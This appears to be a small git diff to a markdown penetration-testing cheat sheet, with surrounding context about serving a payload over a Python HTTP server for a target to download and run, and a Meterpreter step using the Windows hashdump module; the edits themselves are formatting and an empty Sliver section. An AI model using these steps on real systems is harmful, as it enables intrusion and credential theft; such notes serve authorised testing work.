@@ -21,8 +21,8 @@ sudo python3 -m http.server 8000
 # get the target to download and execute the payload
 ```
 
-**Meterpreter**
-Change exploits from Meterpreter to `post/windows/gather/hashdump`. 
+**Meterpreter**  
+Change exploits to `post/windows/gather/hashdump`. 
 ```bash
 # attacker: terminal 1 (after a shell has been opened)
 background                       # put session into the background 
@@ -95,3 +95,6 @@ execute
 ```
 
 ## Sliver
+```bash
+# text goes here
+```
